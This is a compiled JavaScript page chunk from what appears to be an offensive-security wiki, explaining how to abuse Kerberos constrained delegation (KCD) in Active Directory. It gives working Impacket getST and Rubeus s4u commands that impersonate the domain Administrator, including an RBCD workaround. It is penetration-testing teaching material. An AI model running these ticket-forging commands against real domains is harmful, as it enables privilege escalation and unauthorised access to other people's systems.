import{_ as h}from"./chunks/KCD mindmap.epl9Po8C.js";import{_ as c,c as d,a5 as n,G as s,w as a,j as e,a as i,B as l,o as p}from"./chunks/framework.B5CpDqM0.js";const k="/assets/KCD%20with%20Protocol%20Transition%20ADUC%20settings.B7VMP8dr.png",u="/assets/KDC%20without%20Protocol%20Transition%20ADUC%20settings.C9LZ8yyf.png",w=JSON.parse('{"title":"(KCD) Constrained","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"ad/movement/kerberos/delegations/constrained.md","filePath":"ad/movement/kerberos/delegations/constrained.md","lastUpdated":1724982529000}'),g={name:"ad/movement/kerberos/delegations/constrained.md"};function b(m,t,f,y,F,E){const r=l("PluginTabsTab"),o=l("PluginTabs");return p(),d("div",null,[t[6]||(t[6]=n('<h1 id="kcd-constrained" tabindex="-1">(KCD) Constrained <a class="header-anchor" href="#kcd-constrained" aria-label="Permalink to &quot;(KCD) Constrained&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>If a service account, configured with constrained delegation to another service, is compromised, an attacker can impersonate any user (e.g. domain admin, except users protected against delegation) in the environment to access another service the initial one can delegate to.</p><div class="warning custom-block"><p>If the &quot;impersonated&quot; account is &quot;<a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts" target="_blank" rel="noreferrer">is sensitive and cannot be delegated</a>&quot; or a member of the &quot;<a href="https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group" target="_blank" rel="noreferrer">Protected Users</a>&quot; group, the delegation will fail.</p></div><div class="tip custom-block"><p>The native, RID 500, &quot;Administrator&quot; account doesn&#39;t benefit from that restriction, even if it&#39;s added to the Protected Users group (source: <a href="https://sensepost.com/blog/2023/protected-users-you-thought-you-were-safe-uh/" target="_blank" rel="noreferrer">sensepost.com</a>).</p></div><p>Constrained delegation can be configured with or without protocol transition. Abuse methodology differs for each scenario. The paths differ but the result is the same: a Service Ticket to authenticate on a target service on behalf of a user.</p><p>Once the final Service Ticket is obtained, it can be used with <a href="./../ptt">Pass-the-Ticket</a> to access the target service.</p><div class="tip custom-block"><p>On a side note, a technique called <a href="./../ptt#modifying-the-spn">AnySPN or &quot;service class modification&quot;</a> can be used concurrently with pass-the-ticket to change the service class the Service Ticket was destined to (e.g. for the <code>cifs/target.domain.local</code> SPN, the service class is <code>cifs</code>).</p></div><p><img src="'+h+'" alt=""></p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><h3 id="with-protocol-transition" tabindex="-1">With protocol transition <a class="header-anchor" href="#with-protocol-transition" aria-label="Permalink to &quot;With protocol transition&quot;">​</a></h3><p class="caption"><img src="'+k+'" alt=""> Domain Controller &gt; Active Directory Users and Computers &gt; delegation properties of a user</p><p>If a service is configured with constrained delegation with protocol transition, then it can obtain a service ticket on behalf of a user by combining S4U2self and S4U2proxy requests, as long as the user is not sensitive for delegation, or a member of the &quot;Protected Users&quot; group. The service ticket can then be used with <a href="./../ptt">pass-the-ticket</a>. This process is similar to <a href="./rbcd">resource-based contrained delegation</a> exploitation.</p><div class="tip custom-block"><p>See the <a href="./rbcd">rbcd.md</a> article for more insight.</p></div>',14)),s(o,null,{default:a(()=>[s(r,{label:"UNIX-like"},{default:a(()=>t[0]||(t[0]=[e("p",null,[i("From UNIX-like systems, "),e("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),i("'s "),e("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py",target:"_blank",rel:"noreferrer"},"getST"),i(" (Python) script can be used for that purpose.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"getST"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -spn"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "cifs/target"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -impersonate"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "Administrator"'),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"/"'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'":"'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1),e("div",{class:"tip custom-block"},[e("p"),e("div",{class:"language- vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"}),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",null,"[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)")]),i(`
`),e("span",{class:"line"},[e("span",null,"[-] Probably SPN is not allowed to delegate by user user1 or initial TGT not forwardable")])])])]),e("p",null,"When attempting to exploit that technique, if the error above triggers, it means that either"),e("ul",null,[e("li",null,'the account was sensitive for delegation, or a member of the "Protected Users" group.'),e("li",null,[i("or the constrained delegations are configured "),e("a",{href:"./constrained#without-protocol-transition"},"without protocol transition")])])],-1)])),_:1}),s(r,{label:"Windows"},{default:a(()=>t[1]||(t[1]=[e("p",null,[i("From Windows machines, "),e("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),i(" (C#) can be used to conduct a full S4U2 attack (S4U2self + S4U2proxy).")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," s4u "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"nowrap "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"msdsspn:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"cifs/target"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"impersonateuser:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"administrator"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"domain"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"user"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"password:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"password"')])])])],-1)])),_:1})]),_:1}),t[7]||(t[7]=n('<h3 id="without-protocol-transition" tabindex="-1">Without protocol transition <a class="header-anchor" href="#without-protocol-transition" aria-label="Permalink to &quot;Without protocol transition&quot;">​</a></h3><p class="caption"><img src="'+u+'" alt=""> Domain Controller &gt; Active Directory Users and Computers &gt; delegation properties of a user</p><p>If a service is configured with constrained delegation without protocol transition (i.e. set with &quot;Kerberos only&quot;), then S4U2self requests won&#39;t result in forwardable service tickets, hence failing at providing the requirement for S4U2proxy to work.</p><p>This means the service cannot, by itself, obtain a forwardable ticket for a user to itself (i.e. what S4U2Self is used for). A service ticket will be obtained, but it won&#39;t be forwardable. And S4U2Proxy usually needs an forwardable ST to work.</p><p>There are two known ways attackers can use to bypass this and obtain a forwardable ticket, on behalf of a user, to the requesting service (i.e. what S4U2Self would be used for):</p><ol><li>By operating an RBCD attack on the service.</li><li>By forcing or waiting for a user to authenticate to the service while a &quot;Kerberos listener&quot; is running.</li></ol><p>While the &quot;ticket capture&quot; way would theoretically work, the RBCD approach is preferred since it doesn&#39;t require control over the service&#39;s SPN&#39;s host (needed to start a Kerberos listener). Consequently, only the RBCD approach is described here at the moment.</p><h4 id="rbcd-approach" tabindex="-1">RBCD approach <a class="header-anchor" href="#rbcd-approach" aria-label="Permalink to &quot;RBCD approach&quot;">​</a></h4><p>The service account (called serviceA) configured for KCD needs to be configured for RBCD (Resource-Based Constrained Delegations). The service&#39;s <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute needs to be appended with an account controlled by the attacker (e.g. serviceB). The attacker-controlled account must meet the necessary <a href="./../#tickets">requirements for service ticket requests</a> (i.e. have at least one SPN, or have its <code>sAMAccountName</code> end with <code>$</code>).</p><h5 id="_1-full-s4u2-self-proxy" tabindex="-1">1. Full S4U2 (self + proxy) <a class="header-anchor" href="#_1-full-s4u2-self-proxy" aria-label="Permalink to &quot;1. Full S4U2 (self + proxy)&quot;">​</a></h5><p>The attacker can then proceed to a full S4U attack (S4U2self + S4U2proxy, a standard <a href="./rbcd">RBCD attack</a> or <a href="./constrained#with-protocol-transition">KCD with protocol transition</a>) to obtain a forwardable ST from a user to one of serviceA&#39;s SPNs, using serviceB&#39;s credentials.</p>',11)),s(o,null,{default:a(()=>[s(r,{label:"UNIX-like"},{default:a(()=>t[2]||(t[2]=[e("p",null,[i("From UNIX-like systems, "),e("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),i("'s "),e("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py",target:"_blank",rel:"noreferrer"},"getST"),i(" (Python) script can be used for that purpose.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"getST"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -spn"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "cifs/serviceA"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -impersonate"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "administrator"'),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "domain/serviceB:password"')])])])],-1)])),_:1}),s(r,{label:"Windows"},{default:a(()=>t[3]||(t[3]=[e("p",null,[i("From Windows machines, "),e("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),i(" (C#) can be used to conduct a full S4U2 attack (S4U2self + S4U2proxy)")],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," s4u "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"nowrap "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"msdsspn:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"cifs/target"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"impersonateuser:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"administrator"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"domain"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"user"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"password:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"password"')])])])],-1)])),_:1})]),_:1}),t[8]||(t[8]=e("h5",{id:"_2-additional-s4u2proxy",tabindex:"-1"},[i("2. Additional S4U2proxy "),e("a",{class:"header-anchor",href:"#_2-additional-s4u2proxy","aria-label":'Permalink to "2. Additional S4U2proxy"'},"​")],-1)),t[9]||(t[9]=e("p",null,"Once the ticket is obtained, it can be used in a S4U2proxy request, made by serviceA, on behalf of the impersonated user, to obtain access to one of the services serviceA can delegate to.",-1)),s(o,null,{default:a(()=>[s(r,{label:"UNIX-like"},{default:a(()=>t[4]||(t[4]=[e("p",null,[i("From UNIX-like systems, "),e("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),i("'s "),e("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py",target:"_blank",rel:"noreferrer"},"getST"),i(" (Python) script can be used for that purpose.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"getST"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -spn"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "cifs/target"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -impersonate"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "administrator"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -additional-ticket"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "administrator.ccache"'),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "domain/serviceA:password"')])])])],-1)])),_:1}),s(r,{label:"Windows"},{default:a(()=>t[5]||(t[5]=[e("p",null,[i("From Windows machines, "),e("a",{href:"https://github.com/GhostPack/Rubeus",target:"_blank",rel:"noreferrer"},"Rubeus"),i(' (C#) can be used to obtain a Service Ticket through an S4U2proxy request, supplying as "additional ticket" the Service Ticket obtained before.')],-1),e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Rubeus.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," s4u "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"nowrap "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"msdsspn:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"cifs/target"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"impersonateuser:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"administrator"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"tgs:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"base64 | file.kirbi"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"domain:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"domain"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"user:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"user"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"password:"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"password"')])])])],-1)])),_:1})]),_:1}),t[10]||(t[10]=n('<div class="tip custom-block"><p>Computer accounts can edit their own &quot;rbcd attribute&quot; (i.e. <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>). If the account configured with KCD without protocol transition is a computer, controlling another account to operate the RBCD approach is not needed. In this case, serviceB = serviceA, the computer account can be configured for a &quot;self-rbcd&quot;.</p><p><strong>Nota bene</strong>: around Aug./Sept. 2022, Microsoft seems to have patched the &quot;self-rbcd&quot; approach, but relying on another account for the RBCD will still work.</p></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://blog.stealthbits.com/constrained-delegation-abuse-abusing-constrained-delegation-to-achieve-elevated-access/" target="_blank" rel="noreferrer">https://blog.stealthbits.com/constrained-delegation-abuse-abusing-constrained-delegation-to-achieve-elevated-access/</a></p><p><a href="https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-theory/" target="_blank" rel="noreferrer">https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-theory/</a></p><p><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-accounts-collude---trustedtoauthfordelegation-who" target="_blank" rel="noreferrer">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-accounts-collude---trustedtoauthfordelegation-who</a></p><p><a href="https://snovvcrash.rocks/2022/03/06/abusing-kcd-without-protocol-transition.html" target="_blank" rel="noreferrer">https://snovvcrash.rocks/2022/03/06/abusing-kcd-without-protocol-transition.html</a></p>',6))])}const B=c(g,[["render",b]]);export{w as __pageData,B as default};